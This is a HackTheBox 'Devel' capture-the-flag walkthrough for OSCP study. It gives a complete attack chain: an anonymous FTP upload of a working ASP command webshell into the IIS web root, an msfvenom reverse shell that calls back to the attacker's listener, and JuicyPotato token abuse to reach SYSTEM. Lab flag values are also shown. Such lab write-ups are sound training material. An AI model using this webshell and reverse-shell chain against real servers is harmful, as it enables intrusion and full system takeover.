---
tags: [HTB, Devel, Windows, IIS, FTP, ASP, SeImpersonate, JuicyPotato, Easy]
platform: HackTheBox
os: Windows 7 Enterprise x86
hostname: DEVEL
difficulty: Easy
ip: $BoxIP
status: Complete
domain: HTB
---

# HTB: Devel, Full Walkthrough

## The gist

Devel is an old standalone Windows host exposing Microsoft FTP and IIS. Anonymous FTP permits files to be written into the IIS web root, so an ASP command shell gives the first foothold as `IIS APPPOOL\Web`.

That service account has `SeImpersonatePrivilege`, a Windows token privilege that allows a process to impersonate an authenticated client. A 32-bit JuicyPotato executable uses that privilege and a compatible COM class identifier to start an x86 reverse shell as `NT AUTHORITY\SYSTEM`.

## Box information

| Item | Value |
|---|---|
| Platform | HackTheBox |
| OS | Windows 7 Enterprise x86 |
| Hostname | DEVEL |
| Domain | HTB |
| Difficulty | Easy |
| IP | $BoxIP |
| Web service | Microsoft IIS 7.5 on TCP/80 |
| File-transfer service | Microsoft FTP with anonymous access on TCP/21 |

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Workspace setup | See section 1 below |
| 2 | Full TCP scan | See section 2 below |
| 3 | Service and version scan | See section 3 below |
| 4 | Web and FTP enumeration | See section 4 below |
| 5 | Build and upload an ASP command shell | See section 5 below |
| 6 | Confirm the foothold and inspect the token | See section 6 below |

## Evidence and loot

The private source workspace is `/home/kali/Platforms/HackTheBox/Devel`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.

## Variables

~~~bash
boxset BoxName Devel
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset BoxDir /tmp/Devel
boxset PlatformDir /home/kali/Platforms/HackTheBox/Devel
boxset WebPort 80
boxset FTPPort 21
boxset ListenPort 4444
boxset PotatoPort 1338
boxset PotatoPath C:\Users\Public\jp32.exe
boxset PayloadPath C:\Users\Public\shell.exe
boxset WebshellPath shell.asp
boxset CLSID '{4991d34b-80a1-4291-83b6-3328366b9097}'
~~~

The target-specific CLSID is represented as `$CLSID` throughout the commands. This keeps the walkthrough reusable while preserving the important rule that COM class identifiers are Windows-build dependent.

## 1. Workspace setup

The standard box workspace stores the transcript, scans, loot, screenshots, and any exploit files separately. Keeping these paths consistent makes it possible to review the run later and prevents payloads from being mixed with ordinary notes.

~~~bash
boxstart $BoxName $BoxIP htb
htblog
~~~

The autonomous transcript and collected artifacts are in `$BoxDir`. The supplied platform transcript is in `$PlatformDir`.

## 2. Full TCP scan

The first scan covers every TCP port because an old Windows host may expose FTP, IIS, SMB, or a nonstandard service that a top-ports scan misses. `-Pn` skips host-discovery assumptions, `-n` avoids DNS delays, `-sT` uses a TCP connect scan, and `-p-` covers all 65,535 ports.

~~~bash
sudo nmap -Pn -n -sT -p- --min-rate 5000 $BoxIP -oN nmap/allports.txt
~~~

Only TCP/21 and TCP/80 were open.


SCREENSHOT: Red box the open FTP and HTTP ports. Green can cover the host-up result and complete all-port scope.

## 3. Service and version scan

The targeted service scan identifies the server software and runs default scripts against the ports found above. The `ftp-anon` result is immediately important because anonymous read or write access can turn FTP into a file-delivery or web-root write primitive.

~~~bash
sudo nmap -Pn -n -sT -sC -sV -p $FTPPort,$WebPort $BoxIP -oA nmap/services
~~~

The results were Microsoft FTP with anonymous login permitted and Microsoft IIS 7.5 on the web port. The FTP root contained the default IIS files and an `aspnet_client` directory.

> [!warning] 💡 Hint
> Anonymous FTP is not just a file-disclosure check. Test whether the account can write, then determine whether the FTP root overlaps the web root. A writable web root turns file transfer into code execution.

> [!tip] ⚡ More efficient path
> Use one harmless text file to prove write access and retrieval before uploading a command shell. This separates FTP permissions from IIS execution and reduces payload debugging.


SCREENSHOT: Red box anonymous FTP access and the IIS 7.5 banner. Green can cover the default FTP listing.

## 4. Web and FTP enumeration

IIS commonly executes ASP files from its web root, so the anonymous FTP result must be tested as a possible write primitive rather than treated as a read-only file share. Gobuster checks common names and the ASP-family extensions that IIS may execute.

~~~bash
gobuster dir -u http://$BoxIP/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x asp,aspx,txt,bak,config -t 40 -o nmap/gobuster.txt
curl -s ftp://anonymous:@$BoxIP/
~~~

Gobuster did not reveal an application route beyond the default IIS content. The FTP listing confirmed that the anonymous account could reach the IIS web root. That combination is more useful than the sparse HTTP result: a file placed over FTP can be requested over HTTP.

> [!tip] ⚡
> Once anonymous FTP is shown to write into the IIS root, the default landing page does not need deeper enumeration. Test one harmless server-side file and move directly to the ASP handler.

## 5. Build and upload an ASP command shell

An ASP webshell is enough for this target because IIS 7.5 supports classic ASP. The shell accepts a URL-encoded `cmd` parameter, runs it through `cmd.exe`, and returns standard output. The temporary-file version from the initial test was replaced with this smaller `WScript.Shell.Exec` version because it provides direct command output with fewer moving parts.

~~~asp
<%
Dim cmd, oShell, oExec
cmd = Request.QueryString("cmd")
If cmd <> "" Then
    Set oShell = Server.CreateObject("WSCRIPT.SHELL")
    Set oExec = oShell.Exec("cmd.exe /c " & cmd)
    Response.Write oExec.StdOut.ReadAll()
End If
%>
~~~

Upload the file through anonymous FTP. `--upload-file` performs an FTP `STOR`, and the destination name is kept as `.asp` so IIS maps it to the ASP handler.

~~~bash
curl --upload-file $BoxDir/www/$WebshellPath ftp://$BoxIP/$WebshellPath
curl -sG --data-urlencode 'cmd=whoami' http://$BoxIP/$WebshellPath
~~~

The command returned `iis apppool\web`, proving both that FTP could write to the web root and that IIS executed the uploaded ASP file.

> [!abstract] 🧠 Why
> The shell identity matters more than the fact that the file executed. `IIS APPPOOL\web` determines which token privileges and filesystem permissions are available for the escalation stage.


SCREENSHOT: Red box the `IIS APPPOOL\Web` identity. Green can cover the successful FTP upload and web request.

## 6. Confirm the foothold and inspect the token

The first post-exploitation commands establish the account, hostname, operating system, architecture, group memberships, and enabled privileges. `whoami /all` is particularly important here because the service account identity alone does not reveal whether a token-based escalation path is available.

~~~cmd
whoami /all
hostname
systeminfo
~~~

The shell ran on DEVEL, a standalone Windows 7 Enterprise x86 host at build 7600 with no hotfixes listed. The current token had high mandatory integrity and, most importantly, `SeImpersonatePrivilege` enabled.

> [!warning] 💡 Hint
> Check the process architecture and token privileges before choosing a Potato exploit. JuicyPotato must match the vulnerable process architecture and needs a CLSID that works on the specific Windows build.


SCREENSHOT: Red box the enabled `SeImpersonatePrivilege`. Green can cover the service-account group context.

## 7. Confirm the operating-system details

Architecture matters before transferring a privilege-escalation binary. The operating system is old, but it is explicitly an x86 installation, so an x86 Potato binary and x86 payload are the safe choice. A 64-bit executable may fail before the token-abuse logic is reached.

~~~bash
curl -sG --data-urlencode 'cmd=systeminfo' http://$BoxIP/$WebshellPath | tee $BoxDir/loot/systeminfo.txt
curl -sG --data-urlencode 'cmd=hostname' http://$BoxIP/$WebshellPath | tee $BoxDir/loot/hostname.txt
~~~

The screenshot records the Windows 7 build, x86 system type, and absence of listed hotfixes.


SCREENSHOT: Red box the Windows build, x86 architecture, and no-hotfixes result. Green can cover the hostname.

## 8. Generate an x86 reverse shell

`msfvenom` is used only as a payload generator. It does not exploit the target or provide the privilege escalation. `windows/shell_reverse_tcp` is stageless, which means a plain netcat listener can receive it without a Metasploit handler. The x86 architecture matches the target, and the bad-character list avoids common terminators during file or command-line handling.

~~~bash
msfvenom -a x86 --platform Windows \
  -p windows/shell_reverse_tcp \
  LHOST=$LocalIP LPORT=$ListenPort EXITFUNC=thread \
  -b '\x00\x0a\x0d' -f exe -o $BoxDir/www/shell.exe
file $BoxDir/www/shell.exe
~~~

The generated file was a 32-bit Windows Portable Executable (PE).

## 9. Transfer JuicyPotato and the payload

JuicyPotato abuses `SeImpersonatePrivilege` by coercing a privileged Windows COM service to authenticate to a controlled local COM endpoint. It then uses the captured SYSTEM token to create the requested process. The binary and reverse shell are uploaded to the IIS web root over FTP, then copied into `C:\Users\Public` so the final command uses a stable local path.

~~~bash
wget -q https://github.com/k4sth4/Juicy-Potato/raw/main/x86/jp32.exe \
  -O $BoxDir/www/jp32.exe
curl --upload-file $BoxDir/www/jp32.exe ftp://$BoxIP/jp32.exe
curl --upload-file $BoxDir/www/shell.exe ftp://$BoxIP/shell.exe
curl -sG --data-urlencode \
  "cmd=copy C:\\inetpub\\wwwroot\\jp32.exe C:\\Users\\Public\\jp32.exe" \
  http://$BoxIP/$WebshellPath
curl -sG --data-urlencode \
  "cmd=copy C:\\inetpub\\wwwroot\\shell.exe C:\\Users\\Public\\shell.exe" \
  http://$BoxIP/$WebshellPath
~~~

The target-side directory listing confirmed both files were present. The binary transfer and execution architecture must stay aligned: the x86 JuicyPotato build launches the x86 reverse shell.

> [!tip] 🛠️ Alternative tools
> If the selected Potato binary fails, verify x86 versus x64, try another compatible CLSID, or use a different impersonation primitive. Do not replace a working FTP foothold while debugging the local privilege path.


SCREENSHOT: Red box the copied JuicyPotato binary, x86 payload, and the successful CLSID test. Green can cover the file-transfer results.

## 10. Test the COM class identifier

JuicyPotato needs a CLSID, which is a GUID, or globally unique identifier, identifying a registered Windows Component Object Model (COM) class. The valid list depends on the Windows build, so testing the candidate with `-z` is safer than immediately launching a shell. `-l` selects JuicyPotato's local COM listener port, not the reverse-shell port.

~~~bash
curl -sG --data-urlencode \
  "cmd=$PotatoPath -z -l 1337 -c $CLSID" \
  http://$BoxIP/$WebshellPath | tee $BoxDir/loot/jp-clsid-test.txt
~~~

The test returned `NT AUTHORITY\SYSTEM`, confirming that the CLSID worked on this host.

## 11. Catch the SYSTEM callback

Start the listener before triggering JuicyPotato. `-t *` lets JuicyPotato try its available process-creation methods, `-p` supplies the executable to start with the impersonated token, and `-c` supplies the tested COM class. The local `-l` port only supports the token-abuse exchange.

~~~bash
nc -lvnp $ListenPort
curl -sG --data-urlencode \
  "cmd=$PotatoPath -t * -p $PayloadPath -l $PotatoPort -c $CLSID" \
  http://$BoxIP/$WebshellPath
~~~

JuicyPotato reported successful `CreateProcessWithTokenW` execution and the listener received a Windows command shell. `whoami` returned `nt authority\system`, proving the final privilege level.

~~~cmd
whoami
hostname
~~~


SCREENSHOT: Red box the SYSTEM identity. Green can cover the DEVEL hostname and callback connection.

## 12. Collect the flags privately

The user proof file was in `C:\Users\babis\Desktop`, and the root proof file was in `C:\Users\Administrator\Desktop`. The values are reproduced in the private sections above from this write-up and from the vault log. Store them only in the private box loot file.

~~~cmd
type C:\Users\babis\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
~~~

The original platform screenshot `8.flags.png` remains in the platform archive for private review. It is not embedded in the vault because it displays the flag values.

## 13. Decision points and alternate routes

| Observation | Primary route used here | Useful alternative or fallback |
|---|---|---|
| Anonymous FTP permits writes | Test overlap with the IIS web root | Use FTP only for file staging if the root is not web-accessible |
| ASP executes as an app-pool account | Enumerate `whoami /all` and token privileges | Check weak service permissions, scheduled tasks, and stored credentials |
| `SeImpersonatePrivilege` is enabled | Use a compatible x86 Potato path | Try another CLSID or impersonation exploit matching the OS build |
| Callback fails after Potato runs | Confirm listener and payload architecture | Use a harmless command or local proof before changing the CLSID |

## 14. RUNBOOK V2 Stages Used

- [[OSCP/RUNBOOK V2/Windows - Service Scan]] -- identified Microsoft FTP and IIS 7.5
- [[OSCP/RUNBOOK V2/Windows - FTP Enumeration]] -- confirmed anonymous FTP and the writable IIS root
- [[OSCP/RUNBOOK V2/Windows - Web Enum]] -- checked IIS paths and executable ASP extensions
- [[OSCP/RUNBOOK V2/Windows - Web - FTP Upload]] -- uploaded and triggered the ASP command shell
- [[OSCP/RUNBOOK V2/Windows - Shell Received]] -- confirmed the account, host, and operating system
- [[OSCP/RUNBOOK V2/Windows - Privilege Triage]] -- identified enabled SeImpersonatePrivilege
- [[OSCP/RUNBOOK V2/Windows - SeImpersonate Abuse]] -- used JuicyPotato and a tested CLSID for SYSTEM
- [[OSCP/RUNBOOK V2/Windows - Clean Down]] -- removed target-side uploads and verified the shell was gone

## 15. Collect the flags

- user.txt: `b1c6a7959c491fa01feef0c2d8a24573` (value reproduced in the private sections above)
- root.txt: `7814566d0c404a4d727b57dee9c07c68` (value reproduced in the private sections above)


### Captured flag values from source loot


#### `loot/flags.txt`

```text
user: b1c6a7959c491fa01feef0c2d8a24573
root: 7814566d0c404a4d727b57dee9c07c68
```

## 16. Clean down
Remove every file uploaded to the IIS root and every copy staged in `C:\Users\Public`. The final HTTP check confirms that the ASP execution endpoint no longer exists, while a final FTP listing confirms that only the original IIS files remain.

~~~cmd
del /F /Q C:\Users\Public\shell.exe
del /F /Q C:\Users\Public\jp32.exe
del /F /Q C:\inetpub\wwwroot\shell.exe
del /F /Q C:\inetpub\wwwroot\jp32.exe
del /F /Q C:\inetpub\wwwroot\shell.asp
~~~

~~~bash
curl -s ftp://anonymous:@$BoxIP/ | tee $BoxDir/loot/ftp-root-final.txt
curl -s -o /dev/null -w '%{http_code}\n' \
  http://$BoxIP/$WebshellPath | tee $BoxDir/loot/shell-final-status.txt
~~~

The target was restored to its original FTP contents and the shell endpoint returned 404. The local listener was stopped after the callback and no target helper processes were left running.

> [!warning] 💡 Common mistake
> Remove both the uploaded ASP shell and transferred binaries, then verify the web endpoint returns 404 and the target process list is clean. FTP cleanup should be checked from the web side as well as the filesystem side.

### Completion checklist

- [x] Workspace initialised
- [x] Full TCP scan completed
- [x] FTP and IIS versions identified
- [x] Anonymous FTP access confirmed
- [x] ASP command shell uploaded and triggered
- [x] IIS service-account foothold confirmed
- [x] Windows build and x86 architecture recorded
- [x] SeImpersonatePrivilege confirmed enabled
- [x] x86 reverse shell generated with msfvenom
- [x] x86 JuicyPotato transferred and CLSID tested
- [x] SYSTEM callback received
- [x] User and root proof files collected privately
- [x] Target-side uploads removed
- [x] HTTP 404 and final FTP listing verified

## 17. Attack narrative in one page
1. [[OSCP/RUNBOOK V2/Windows - Service Scan]] found FTP/21 and IIS/80.
2. [[OSCP/RUNBOOK V2/Windows - FTP Enumeration]] confirmed anonymous FTP access to the IIS web root.
3. [[OSCP/RUNBOOK V2/Windows - Web - FTP Upload]] used an uploaded ASP shell to execute commands as `IIS APPPOOL\Web`.
4. [[OSCP/RUNBOOK V2/Windows - Privilege Triage]] identified enabled `SeImpersonatePrivilege`.
5. [[OSCP/RUNBOOK V2/Windows - SeImpersonate Abuse]] used x86 JuicyPotato and an OS-compatible CLSID to launch the x86 reverse shell as SYSTEM.
6. [[OSCP/RUNBOOK V2/Windows - Clean Down]] removed the uploaded files and verified the endpoint returned 404.

## Tools used

- `nmap`
- `curl`
- `wget`
- `gobuster`
- `nc`
- `netcat`
- `ftp`
- `sudo`
- `msfvenom`

## Credentials and secrets

| Account | Source | Use |
|---|---|---|
| IIS APPPOOL\Web | ASP webshell execution context | Initial foothold |
| NT AUTHORITY\SYSTEM | JuicyPotato token impersonation | Final privileged shell |

No passwords or hashes were recovered or required.


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="Devel"
export BoxIP="10.129.1.72"
export BoxPlatform="HackTheBox"
export BoxDir="/home/kali/Platforms/HackTheBox/Devel"
export Domain=""
export DCip=""
export Username=""
export Password=""
export Username2=""
export Password2=""
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="4444"
export Port2="4445"
export WebPort="80"
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

### Sensitive transcript evidence

```text
[sudo] password for kali:
14/07/2009  04:16 ��           152.064 SmartcardCredentialProvider.dll
$ [21:59:30] loot flag user b1c6a7959c491fa01feef0c2d8a24573
  loot hash  <user> <hash>
  loot flag  <user|root> <value>
kali@kali:~/Platforms/HackTheBox/Devel [21:59:08] $ [?1h=[?2004hlllootloloootloott t flag us
[+] Flag saved:  user = b1c6a7959c491fa01feef0c2d8a24573  →  loot/flags.txt
kali@kali:~/Platforms/HackTheBox/Devel [21:59:30] $ [?1h=[?2004hloot flag user b1c6a7959c491fa01feef0c2d8a24573
$ [21:59:48] loot flag root 7814566d0c404a4d727b57dee9c07c68
[+] Flag saved:  root = 7814566d0c404a4d727b57dee9c07c68  →  loot/flags.txt
kali@kali:~/Platforms/HackTheBox/Devel [22:02:37] $ [?1h=[?2004hllloot flag root 7814566d0c404a4d727b57dee9c07c68
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on Devel | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

- Anonymous FTP should be tested for write access whenever the FTP root resembles a web root.
- Always verify architecture before transferring a Windows exploit or payload. This host and both useful binaries were x86.
- `SeImpersonatePrivilege` is a direct routing clue to the Potato family. Test the CLSID first because COM registrations vary by Windows build.
- A stageless `msfvenom` shell keeps the final callback independent of the Metasploit exploitation framework.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/Windows/Buff|Buff]] -- IIS-adjacent web foothold, payload delivery, and manual Windows exploitation
- [[OSCP/BOXES/WRITE UPS/Windows/Servmon|Servmon]] -- Windows shell followed by service and token privilege escalation
- [[OSCP/BOXES/WRITE UPS/Windows/Jerry|Jerry]] -- direct Windows webshell-to-SYSTEM context
- [[OSCP/BOXES/WRITE UPS/Windows/Chatterbox|Chatterbox]] -- x86 Windows shellcode and manual exploit workflow

## External resources

- [JuicyPotato](https://github.com/ohpe/juicy-potato) -- original project and CLSID guidance
- [Juicy-Potato x86 build](https://github.com/k4sth4/Juicy-Potato) -- x86 binary used during the run
- [HackTricks Windows privilege escalation](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html) -- token and Potato-family background
- [Microsoft IIS FTP configuration](https://learn.microsoft.com/en-us/iis/publish/using-the-ftp-service/configuring-ftp-user-isolation-in-iis-7) -- IIS FTP concepts
- [ippsec.rocks: Devel](https://ippsec.rocks/?q=Devel) -- additional walkthrough references

## Related RUNBOOK V2 stages

- [[OSCP/RUNBOOK V2/Start Here]]
- [[OSCP/RUNBOOK V2/Windows - Service Scan]]
- [[OSCP/RUNBOOK V2/Windows - Web Enum]]
- [[OSCP/RUNBOOK V2/Windows - Shell Received]]
- [[OSCP/RUNBOOK V2/Windows - Privilege Triage]]
- [[OSCP/RUNBOOK V2/Windows - Clean Down]]

## Why this matters for OSCP

Devel combines several exam habits in a short chain: read service-script output closely, treat anonymous FTP as a possible web-root write, match binaries to the target architecture, and route enabled token privileges to the correct manual escalation family.
